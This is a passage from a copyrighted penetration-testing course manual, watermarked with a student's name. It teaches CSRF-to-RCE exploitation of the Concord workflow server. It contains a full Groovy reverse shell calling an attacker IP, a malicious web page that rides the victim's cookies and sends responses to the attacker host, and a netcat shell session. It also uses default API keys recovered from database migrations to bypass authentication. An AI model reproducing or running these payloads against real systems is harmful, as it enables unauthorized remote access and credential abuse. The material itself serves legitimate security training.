and review its functionality, we will need to use the documentation. 
Fortunately for us, the Concord API documentation239 is fairly extensive. Since CORS headers are 
often enabled to allow for browsers to communicate with the API, this is a great place to start our 
research. 
Because Concord has placed some restrictions on the CORS header, we must be selective in the 
types of requests we are searching for. When we review the documentation, we’ll search for a 
 
238 (OWASP, 2021), https://cheatsheetseries.owasp.org/cheatsheets/Cross-
Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation 
239 (Walmart, 2021), https://concord.walmartlabs.com/docs/api/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
415 
GET request that allows us to obtain sensitive information (like secrets or API keys), a GET 
request that changes the state of the application, or a POST request that only uses standard 
content-types. 
The first section that catches our attention pertains to the “API Key”.240 This section describes an 
endpoint that “Creates a new API key for a user.” 
 
Figure 297: Create API Key Documentation 
The request is sent with a POST request using the application/json content type. Unfortunately, 
this won’t work as the browser will send an OPTIONS request before the POST request. As we’ve 
learned earlier, the responses to OPTIONS requests in Concord contain different CORS headers 
that are less vulnerable. Let’s keep searching. 
The next endpoint, labeled “List Existing API keys”, seems a bit more promising. 
 
240 (Walmart, 2021), https://concord.walmartlabs.com/docs/api/apikey.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
416 
 
Figure 298: List API Key Documentation 
This is a GET request that shouldn’t need an OPTIONS request. Closer examination reveals that 
this API “only returns metadata, not actual keys.” While we know we can send this request and 
access the response, we won’t be able to obtain anything that gets us more access than we 
currently have. 
Further review of the API documentation reveals that the GET requests only provide us with 
information disclosure, and may not improve our level of access. However, we eventually discover 
an interesting section under “process”, which states: 
A process is an execution of a flow in repository of a project. 
If we can start a process, we might be able to execute commands. Let’s review what type of 
request is required. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
417 
 
Figure 299: Start a Process Documentation 
This request requires the use of a POST method with the content-type of “multipart/form-data”. 
According to Mozilla, a “multipart/form-data” content type does not require a preflight check.241 
The Concord documentation also states that we can use the Authorization header. The 
authentication documentation indicates that the Authorization header can be used for API keys 242 
in curl requests. This header was also used in the login request. 
While a site could authenticate requests solely with an Authorization header, most modern 
graphical sites coded for browser-based clients use cookies for authentication. This is a safe 
assumption since Concord accepts multiple forms of authentication, and the browser must 
authenticate the API calls in some way. In addition, since the server sent the Access-Control-
Allow-Credentials header, we can assume that cookies are used for session management. 
Let’s continue our review of the process API call to determine what else we may need in order to 
exploit Concord. 
Further down in the documentation we discover text describing how to start a Concord process 
by uploading a ZIP file: 
 
241 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests 
242 (Walmart, 2021), https://concord.walmartlabs.com/docs/getting-started/security.html#using-api-tokens 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
418 
 
Figure 300: ZIP File Documentation 
The documentation explains how we can create a zip archive with a concord.yml file that contains 
a “flow”. We’ll review the documentation for flows later, but for now let’s review the example curl 
request. 
This curl command sends a GET request to /api/v1/process and specifies the ZIP with the -F 
flag. Let’s get more information about this flag from the curl help output. 
kali@kali:~$ curl --help all 
Usage: curl [options...] <url> 
     --abstract-unix-socket <path> Connect via abstract Unix domain socket 
     --alt-svc <file name> Enable alt-svc with this cache file 
     --anyauth       Pick any authentication method 
 -a, --append        Append to target file when uploading 
... 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
419 
 -F, --form <name=content> Specify multipart MIME data 
     --form-string <name=string> Specify multipart MIME data 
 ... 
Listing 455 - curl Help 
According to curl, the -F flag specifies multipart data. 
Based on this, we conclude that we can start a process by sending a request to /api/v1/process 
with a ZIP file named “archive” containing a concord.yml file. 
If we dig deeper into the documentation, we discover that we don’t even need to provide a ZIP file, 
only a concord.yml file. 
 
Figure 301: Start Process with Only concord.yml 
Next, let’s review the process documentation to search for potential paths to code execution. 
The “Directory Structure” section243 defines the concord.yml file: 
concord.yml: a Concord DSL file containing the main flow, configuration, profiles 
and other declarations; 
In Concord, a DSL file defines various configurations, flows, and profiles.244 Earlier, the 
documentation mentioned that the uploaded file must contain a flow. Let’s review the 
documentation pertaining to a flow: 
 
243 (Walmart, 2021), https://concord.walmartlabs.com/docs/processes-v1/index.html#directory-structure 
244 (Walmart, 2021), https://concord.walmartlabs.com/docs/processes-v1/index.html#dsl 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
420 
 
Figure 302: Flow Documentations 
Concord describes a flow as a “series of steps executing various actions”. This seems to be a 
perfect command execution vector. Let’s determine how we can get Concord to execute system 
commands. 
We can find examples of flows that execute code in the “Scripting” section of the 
documentation.245 We’ll use the Groovy example to build our payload. 
 
245 (Walmart, 2021), https://concord.walmartlabs.com/docs/getting-started/scripting.htm 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
421 
 
Figure 303: Groovy Documentation 
The documentation indicates that we must first import the groovy dependency: 
configuration: 
  dependencies: 
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2" 
 
Listing 456 - Building Groovy Payload - Dependency 
Next, since the documentation states we must provide at least one flow, we’ll set the script 
variable to “groovy” (as shown in the example) to instruct concord to execute the command as 
groovy. 
configuration: 
  dependencies: 
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2" 
flows: 
  default: 
    - script: groovy 
Listing 457 - Building Groovy Payload - flow 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
422 
Once that is set up, we need to add a body with a script. We’ll use a YML HereDoc246 for this so we 
don’t have to write a one-liner. We’ll use a common groovy reverse shell as our script and format 
it for readability.247 
configuration: 
  dependencies: 
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2" 
flows: 
  default: 
    - script: groovy 
      body: | 
         String host = "192.168.118.2"; 
         int port = 9000; 
         String cmd = "/bin/sh"; 
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start(); 
         Socket s = new Socket(host, port); 
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = 
s.getInputStream(); 
         OutputStream po = p.getOutputStream(), so = s.getOutputStream(); 
         while (!s.isClosed()) { 
         while (pi.available() > 0) so.write(pi.read()); 
         while (pe.available() > 0) so.write(pe.read()); 
         while (si.available() > 0) po.write(si.read()); 
         so.flush(); 
         po.flush(); 
         Thread.sleep(50); 
         try { 
            p.exitValue(); 
            break; 
         } catch (Exception e) {} 
         }; 
         p.destroy(); 
         s.close(); 
Listing 458 - Building Groovy Payload - Reverse Shell 
This will become the concord.yml file that we will send to the server. We’ll save this payload for 
later. Next, we need to create the delivery mechanism. As mentioned earlier, we will create a 
website that will send this payload. We’ll start with an empty HTML page that contains a single 
script tag. 
<html> 
    <head> 
        <script> 
        </script> 
    </head> 
    <body> 
    </body> 
</html> 
Listing 459 - Basic HTML Page 
 
246 (Lzone, 2021), https://lzone.de/cheat-sheet/YAML#yaml-heredoc-multiline-strings 
247 (frohoff, 2021), https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
423 
Next, we need to add some JavaScript between the script tags that will send the API call to 
deliver the concord.yml payload. Before we do that, we’ll send the “whoami” request to determine 
if the user is actually logged in. This isn’t strictly necessary but it will make the exploit more 
effective, less noisy, and will provide us with more usable data. 
<script> 
    fetch("http://concord:8001/api/service/console/whoami", { 
        credentials: 'include' 
    }) 
    .then(async (response) => { 
        if(response.status != 401){ 
            let data = await response.text(); 
            fetch("http://192.168.118.2/?msg=" + data ) 
        }else{ 
            fetch("http://192.168.118.2/?msg=UserNotLoggedIn" ) 
        } 
    }) 
</script> 
Listing 460 - Using Fetch to Call whoami 
The code in Listing 460 will first send a request to the target server and the target endpoint with 
the credentials (cookies). If the response status is not 401, the captured data will be sent back. If 
the response status is 401, a message will be sent back to our Kali server. 
Let’s save the contents of this into ~/concord/index.html and use Python to start an HTTP server 
on port 80. 
kali@kali:~$ mkdir concord 
 
kali@kali:~$ cd concord/ 
 
kali@kali:~/concord$ mousepad index.html 
 
kali@kali:~/concord$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
Listing 461 - Serving HTML with whoami Request 
Next, we’ll visit this page in Firefox to validate that it is working. Since we are not logged into 
Concord, we should expect to hit the else branch and return a “UserNotLoggedIn” message. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
424 
 
Figure 304: Visiting Page in Firefox 
When we check the Python HTTP server logs, we find that we indeed received a 
“UserNotLoggedIn” message. 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET / HTTP/1.1" 200 - 
192.168.118.2 - - [07/Apr/2021 19:35:30] code 404, message File not found 
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /favicon.ico HTTP/1.1" 404 - 
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /?msg=UserNotLoggedIn HTTP/1.1" 200 - 
Listing 462 - UserNotLoggedIn in Logs 
Using the provided Kali debugger, we have access to a user activity simulator that will visit any 
page we provide. The simulator includes a user authenticated to Concord. We’ll use this simulator 
to test our current payload to verify that it is working. 
To connect, we’ll RDP to the Kali debugger and visit http://simulator. We’ll enter our Kali IP and 
click Simulate. 
Once the simulation is complete, we’ll again check our HTTP server logs. 
192.168.121.253 - - [07/Apr/2021 19:48:44] "GET / HTTP/1.1" 200 - 
192.168.121.253 - - [07/Apr/2021 19:48:45] "GET 
/?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent
%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 - 
Listing 463 - Logged In User Executing Payload 
As expected, the CORS payload worked. When an authenticated user visited the page, our 
malicious site was able to send a request to Concord and include the user’s credentials. Let’s 
decode the message to understand what kind of information we were able to obtain. 
{ 
    "realm": "apikey", 
    "username": "concordAgent", 
    "displayName": "concordAgent" 
} 
Listing 464 - Decoded Message 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
425 
We seem to have phished the concordAgent user. Next, let’s attempt to reach code execution by 
sending the concord.yml file we created earlier. We’ll start by defining the YAML at the beginning 
of the script tags in the HTML file. We’ll use a string template to make the payload easier to edit if 
we need to. It’s important to note that YAML is very sensitive to whitespace, so we cannot use 
additional tabs to make this document format easier to read. 
   <script> 
        yml = ` 
configuration: 
  dependencies: 
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8" 
 
flows: 
  default: 
    - script: groovy 
      body: | 
         String host = "192.168.118.2"; 
         int port = 9000; 
         String cmd = "/bin/sh"; 
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start(); 
         Socket s = new Socket(host, port); 
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = 
s.getInputStream(); 
         OutputStream po = p.getOutputStream(), so = s.getOutputStream(); 
         while (!s.isClosed()) { 
         while (pi.available() > 0) so.write(pi.read()); 
         while (pe.available() > 0) so.write(pe.read()); 
         while (si.available() > 0) po.write(si.read()); 
         so.flush(); 
         po.flush(); 
         Thread.sleep(50); 
         try { 
            p.exitValue(); 
            break; 
         } catch (Exception e) {} 
         }; 
         p.destroy(); 
         s.close(); 
` 
 
      fetch("http://concord:8001/api/service/console/whoami", { 
         credentials: 'include' 
      }) 
... 
   </script> 
Listing 465 - Adding Yaml to HTML 
Next, we will define a function at the end of the script tags that will post the concord.yml file. 
function rce() { 
   var ymlBlob = new Blob([yml], { type: "application/yml" }); 
   var fd = new FormData(); 
   fd.append('concord.yml', ymlBlob); 
   fetch("http://concord:8001/api/v1/process", { 
      // FIXME 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
426 
      body: fd 
   }) 
   .then(response => response.text()) 
   .then(data => { 
      fetch("http://192.168.118.2/?msg=" + data ) 
   }).catch(err => { 
      fetch("http://192.168.118.2/?err=" + err ) 
   }); 
} 
Listing 466 - Post concord.yml 
We’ll start by creating a blob from the yml string with the content-type of “application/yml”. This 
will not change the content-type header of the request, but will define the content-type in the form-
data for fetch. Next, we’ll create the form-data and append the concord.yml document. Once set 
up, we’ll use fetch to send the appropriate request. We’ll capture all responses and errors. 
Finally, we’ll need to edit the login check request we sent earlier to run the rce function when a 
user is authenticated. 
... 
    fetch("http://concord:8001/api/service/console/whoami", { 
        credentials: 'include' 
    }) 
    .then(async (response) => { 
        if(response.status != 401){ 
            let data = await response.text(); 
            fetch("http://192.168.118.2/?msg=" + data ); 
            rce(); 
        }else{ 
            fetch("http://192.168.118.2/?msg=UserNotLoggedIn" ); 
        } 
    }) 
... 
Listing 467 - Using Fetch to Call whoami 
Now that the payload is ready, we need to open a netcat listener to catch the shell. This should 
match the settings that we configured in our payload, including setting the port to 9000. 
kali@kali:~$ nc -nvlp 9000 
listening on [any] 9000 ... 
Listing 468 - Starting Listener 
We’ll once again send our Kali IP to the user simulator. Once the simulation runs, we should find a 
new log entry in our HTTP server. 
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET / HTTP/1.1" 200 - 
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET 
/?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent
%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 - 
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET 
/?msg={%20%20%22instanceId%22%20:%20%22a85f6fef-69cb-4127-975c-
9aa97584415e%22,%20%20%22ok%22%20:%20true} HTTP/1.1" 200 - 
Listing 469 - Concord New Process Response 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
427 
This new log entry contains the response the victim’s browser received when a new process was 
added. 
Our listener should also indicate that we caught a shell. 
kali@kali:~$ nc -nvlp 9000 
listening on [any] 9000 ... 
connect to [192.168.118.2] from (UNKNOWN) [192.168.120.132] 39888 
whoami 
concord 
 
ls -alh 
total 28K 
drwxr-xr-x 4 concord concord 4.0K Apr  8 00:27 . 
drwx------ 3 concord concord 4.0K Apr  8 00:27 .. 
drwxr-xr-x 2 concord concord 4.0K Apr  8 00:27 .concord 
drwxr-xr-x 3 concord concord 4.0K Apr  8 00:27 _attachments 
-rw-r--r-- 1 concord concord   36 Apr  8 00:27 _instanceId 
-rw-r--r-- 1 concord concord  978 Apr  8 00:27 _main.json 
-rw-r--r-- 1 concord concord  956 Apr  8 00:27 concord.yml 
Listing 470 - Reverse Shell 
Excellent! We now have RCE in Concord! 
11.2.5.1 Exercises 
1. 
We’ve left out some important options in the rce function that require the payload to work. 
Fix the payload to include the appropriate fetch options. 
2. 
Add content to the HTML to make the page look more legitimate. 
3. 
Build a payload in Python. 
4. 
Build a payload in Ruby. 
11.2.5.2 Extra Miles 
1. 
Using the shell, add a new user to Concord and authenticate as the new user. 
2. 
So far we have been using a version of Concord vulnerable to permissive CORS. As 
mentioned, the permissive CORS headers are not necessary for exploiting the CSRF 
vulnerability. SSH into the Concord server and run the following commands to stop the old 
version of Concord and start the newer version. 
student@concord:~$ sudo docker-compose -f concord-1.43.0/docker-compose.yml down 
Stopping concord1430_concord-agent_1  ... done 
Stopping concord1430_concord-server_1 ... done 
Stopping concord1430_concord-dind_1   ... done 
Stopping concord1430_concord-db_1     ... done 
Removing concord1430_concord-agent_1  ... done 
Removing concord1430_concord-server_1 ... done 
Removing concord1430_concord-dind_1   ... done 
Removing concord1430_concord-db_1     ... done 
Removing network concord1430_concord 
 
student@concord:~$ sudo docker-compose -f concord-1.83.0/docker-compose.yml up -d 
Creating network "concord1830_concord" with the default driver 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
428 
Creating concord1830_concord-db_1 ...  
Creating concord1830_concord-dind_1 ...  
Creating concord1830_concord-db_1 
Creating concord1830_concord-dind_1 ... done 
Creating concord1830_concord-server_1 ...  
Creating concord1830_concord-server_1 ... done 
Creating concord1830_concord-agent_1 ...  
Creating concord1830_concord-agent_1 ... done 
Listing 471 - Starting Newer version of Concord 
Using this newer version of Concord, change the payload and exploit the CSRF vulnerability. 
11.3 Authentication Bypass: Round Two - Insecure Defaults 
So far, we’ve demonstrated the power of CSRF and how it can lead to remote code execution. 
Due to modern browser updates, CSRF vulnerabilities are becoming more and more obsolete and 
we must find other authentication bypass vulnerabilities. Luckily for us, Concord is installed and 
configured with insecure defaults that lead to authentication bypass. 
While the Concord version we’ve been using so far is also vulnerable to the insecure defaults we’ll 
discover, we will focus on a newer version to demonstrate that it is also vulnerable to this 
approach. Let’s download the code to our Kali VM and start the newer version of the application. 
We’ll download the code with rsync, providing the -az flags to download as a compressed 
archive. We’ll also provide the username and host (student@concord), the path to download 
(/home/student/concord-1.83.0/), and the download location (concord/). 
kali@kali:~$ rsync -az student@concord:/home/student/concord-1.83.0/ concord/ 
student@concord's password:  
Listing 472 - Downloading the Source Code 
As the code downloads, we’ll ssh into the Concord server, stop the old version, and start the new 
version. Concord uses Docker248 to run the application, so we can use the docker-compose 
command to stop and start the application. 
First we’ll stop the old application with down, providing the appropriate docker-compose file with -
f. 
kali@kali:~/concord$ ssh student@concord 
student@concord's password:  
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
 
student@concord:~$ sudo docker-compose -f concord-1.43.0/docker-compose.yml down 
[sudo] password for student:  
Stopping concord1430_concord-agent_1  ... done 
Stopping concord1430_concord-server_1 ... done 
Stopping concord1430_concord-dind_1   ... done 
Stopping concord1430_concord-db_1     ... done 
Removing concord1430_concord-agent_1  ... done 
Removing concord1430_concord-server_1 ... done 
Removing concord1430_concord-dind_1   ... done 
 
248 (Docker, 2021), https://www.docker.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
429 
Removing concord1430_concord-db_1     ... done 
Removing network concord1430_concord 
Listing 473 - Stopping Concord 
Next, we’ll start the new version, this time using the docker-compose.yml file located in the 
concord-1.83.0 folder. We’ll use the up command to start the application, but add -d to run 
docker-compose in the background. 
student@concord:~$ sudo docker-compose -f concord-1.83.0/docker-compose.yml up -d 
Creating network "concord1830_concord" with the default driver 
Creating concord1830_concord-dind_1 ...  
Creating concord1830_concord-db_1 ...  
Creating concord1830_concord-dind_1 
Creating concord1830_concord-db_1 ... done 
Creating concord1830_concord-server_1 ...  
Creating concord1830_concord-server_1 ... done 
Creating concord1830_concord-agent_1 ...  
Creating concord1830_concord-agent_1 ... done 
student@concord:~$  
Listing 474 - Starting Concord 
At this point, we should be running a newer version of Concord. We’ll begin the vulnerability 
discovery by reviewing the code. More specifically, we’ll review how the application is booted and 
installed. This process starts with the start.sh file in the server/dist/src/assembly/ folder. 
kali@kali:~/concord$ cat server/dist/src/assembly/start.sh 
#!/bin/bash 
 
BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )" 
 
MAIN_CLASS="com.walmartlabs.concord.server.dist.Main" 
if [[ "${CONCORD_COMMAND}" = "migrateDb" ]]; then 
    MAIN_CLASS="com.walmartlabs.concord.server.MigrateDB" 
fi 
 
... 
 
exec java \ 
${CONCORD_JAVA_OPTS} \ 
-Dfile.encoding=UTF-8 \ 
-Djava.net.preferIPv4Stack=true \ 
-Djava.security.egd=file:/dev/./urandom \ 
-Dollie.conf=${CONCORD_CFG_FILE} \ 
-cp "${BASE_DIR}/lib/*:${BASE_DIR}/ext/*:${BASE_DIR}/classes" \ 
"${MAIN_CLASS}" 
Listing 475 - Startup Script 
While reviewing this file, we find that the application will run the class defined in the MAIN_CLASS 
variable. This variable can be set to either the Main class in com.walmartlabs.concord.server.dist 
or MigrateDb in com.walmartlabs.concord.server. Database migrations are used to initialize the 
application or update the applications database to the current version. They might configure the 
tables, columns, and insert data. 
It’s always a good idea to review the migrations to understand the database layout. The 
application may also leave sensitive data in these migrations from the development process. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
430 
As we search the code base for “MigrateDB”, we discover the class declaration in 
server/impl/src/main/java/com/walmartlabs/concord/server/MigrateDB.java. 
public class MigrateDB { 
 
    @Inject 
    @MainDB 
    private DataSource dataSource; 
 
    public static void main(String[] args) throws Exception { 
        EnvironmentSelector environmentSelector = new EnvironmentSelector(); 
        Config cfg = new ConfigurationProcessor("concord-server", 
environmentSelector.select()).process(); 
 
        Injector injector = Guice.createInjector( 
                new WireModule( 
                        new SpaceModule(new 
URLClassSpace(MigrateDB.class.getClassLoader()), BeanScanning.CACHE), 
                        new OllieConfigurationModule("com.walmartlabs.concord.server", 
cfg), 
                        new DatabaseModule())); 
 
        new MigrateDB().run(injector); 
    } 
... 
} 
Listing 476 - MigrateDB class 
After reviewing this file, we find one of the classes referenced is DatabaseModule in 
server/db/src/main/java/com/walmartlabs/concord/db. The com/walmartlabs/concord/db part of 
the path is the class path. We typically won’t find many files in the subpaths, but considering that 
there is a db folder in the path, we can assume this is used to manage the database. Let’s 
navigate closer to the root of this folder (server/db/src/main/) and analyze the folder structure. 
kali@kali:~/concord$ cd server/db/src/main/ 
 
kali@kali:~/concord/server/db/src/main$ tree 
. 
├── java 
│   └── com 
│       └── walmartlabs 
│           └── concord 
│               └── db 
│                   ├── AbstractDao.java 
│                   ├── DatabaseChangeLogProvider.java 
... 
└── resources 
    └── com 
        └── walmartlabs 
            └── concord 
                └── server 
                    └── db 
                        ├── liquibase.xml 
                        ├── v0.0.1.xml 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
431 
                        ├── v0.12.0.xml 
... 
Listing 477 - server/db/src/main Folder structure 
The folder structure reveals that java contains the code and resources contains various XML 
documents, including liquibase.xml. An online search reveals the following about this file: 
Liquibase is an open-source database schema change management solution 
which enables you to manage revisions of your database changes easily. 
These must be the database migrations that include definitions for table names, columns, and 
data. 
Let’s review v0.0.1.xml to familiarize ourselves with the format. 
The author, Ivan Bodrov, left his email in this public repository purposefully. 
<?xml version="1.0" encoding="UTF-8"?> 
<databaseChangeLog 
        xmlns="http://www.liquibase.org/xml/ns/dbchangelog" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog 
http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.3.xsd"> 
... 
    <!-- USERS --> 
 
    <changeSet id="1200" author="ibodrov@gmail.com"> 
        <createTable tableName="USERS" remarks="Users"> 
            <column name="USER_ID" type="varchar(36)" remarks="Unique user ID"> 
                <constraints primaryKey="true" nullable="false"/> 
            </column> 
            <column name="USERNAME" type="varchar(64)" remarks="Unique name of a user 
(login)"> 
                <constraints unique="true" nullable="false"/> 
            </column> 
        </createTable> 
    </changeSet> 
 
... 
</databaseChangeLog> 
Listing 478 - Database Migration 
This database migration shows the creation of the USERS table, which has two columns, USER_ID 
and USERNAME. This might not be the current state of the USERS table since future migrations 
might have added, removed, or renamed columns. However, this gives us an idea of the contents 
in the database. 
Searching further in the same file, we find a database insert that piques our interest. 
    <changeSet id="1440" author="ibodrov@gmail.com"> 
        <insert tableName="API_KEYS"> 
            <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column> 
            <!-- original: auBy4eDWrKWsyhiDp3AQiw --> 
            <column 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
432 
name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column> 
            <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column> 
        </insert> 
    </changeSet> 
Listing 479 - API Key in Migration 
This entry in the migration file inserts an API key into the database. Earlier, we found in the 
documentation that we can use the Authorization header to authenticate with an API key. Let’s try 
to authenticate a request using curl. We’ll use the value in the API_KEY column as the 
Authorization header specified with the -H flag. We’ll also use -i to show the response headers. 
kali@kali:~$ curl -i -H "Authorization: KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA" 
http://concord:8001/api/v1/apikey 
HTTP/1.1 401 Unauthorized 
Date: Fri, 09 Apr 2021 19:44:41 GMT 
Access-Control-Allow-Origin: * 
Access-Control-Allow-Methods: * 
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin 
Access-Control-Expose-Headers: cache-control,content-language,expires,last-
modified,content-range,content-length,accept-ranges 
Cache-Control: no-cache, no-store, must-revalidate 
Pragma: no-cache 
Expires: 0 
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 19:44:41 
GMT 
Content-Length: 0 
Server: Jetty(9.4.26.v20200117) 
Listing 480 - API key Unauthorized Response 
Unfortunately, the response returned a 401 Unauthorized. However, API keys should be treated 
like passwords and hashed when stored, and the Concord developers mistakenly left an “original” 
value above the entry (“auBy4eDWrKWsyhiDp3AQiw”). Let’s try to authenticate with this value 
using curl. 
kali@kali:~$ curl -i -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" 
http://concord:8001/api/v1/apikey 
HTTP/1.1 401 Unauthorized 
Date: Fri, 09 Apr 2021 20:06:37 GMT 
Access-Control-Allow-Origin: * 
Access-Control-Allow-Methods: * 
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin 
Access-Control-Expose-Headers: cache-control,content-language,expires,last-
modified,content-range,content-length,accept-ranges 
Cache-Control: no-cache, no-store, must-revalidate 
Pragma: no-cache 
Expires: 0 
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 20:06:37 
GMT 
Content-Length: 0 
Server: Jetty(9.4.26.v20200117) 
Listing 481 - Using “Original” API Key 
This request also returns an Unauthorized response. Considering this is the first migration 
executed, it shouldn’t come as a surprise that data might have changed. Other migrations might 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
433 
have deleted the entry or moved it. Let’s grep for ‘’ to determine if other migrations have inserted 
values into this table. 
kali@kali:~/concord$ grep -rl '<insert tableName="API_KEYS">' ./ 
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.70.0.xml 
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.69.0.xml 
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.0.1.xml 
Listing 482 - Searching for API Key Entries 
A search for this string resulted in three entries. We already reviewed v0.0.1.xml, so let’s review 
v0.69.0.xml next. 
<?xml version="1.0" encoding="UTF-8"?> 
... 
    <property name="concordAgentUserId" value="d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"/> 
 
    <changeSet id="69000" author="ybrigo@gmail.com"> 
        <insert tableName="USERS"> 
            <column name="USER_ID">${concordAgentUserId}</column> 
            <column name="USERNAME">concordAgent</column> 
            <column name="USER_TYPE">LOCAL</column> 
        </insert> 
         
        <insert tableName="API_KEYS"> 
            <!-- "O+JMYwBsU797EKtlRQYu+Q" --> 
            <column 
name="API_KEY">1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY</column> 
            <column name="USER_ID">${concordAgentUserId}</column> 
        </insert> 
    </changeSet> 
 
</databaseChangeLog> 
Listing 483 - Reviewing v0.69.0.xml 
In this migration, we discover that an API_KEYS table entry is inserted for the concordAgent user. 
Considering that this migration is sixty-eight revisions ahead of the previous migration, this value 
is more likely to still be present in the database. Let’s attempt to use this API key with curl. This 
time, we’ll start with the value commented out above the entry. 
kali@kali:~/concord$ curl -H "Authorization: O+JMYwBsU797EKtlRQYu+Q" 
http://concord:8001/api/v1/apikey 
[ { 
  "id" : "4805382e-98bc-11eb-a54f-0242ac140003", 
  "userId" : "d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8", 
  "name" : "key-1" 
} ] 
Listing 484 - Curl with Newly Discovered API Key 
Excellent! We were able to successfully find a default user that was mistakenly left in by the 
developer and not regenerated during installation. 
The Concord documentation states that it’s possible to log in with an API token by appending 
“?useApiKey=true” to the login URL. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
434 
 
Figure 305: Login Via API Key 
Let’s try to log in to the UI using this API Key. 
OS-555704 RAYMOND ALLEN SORENG
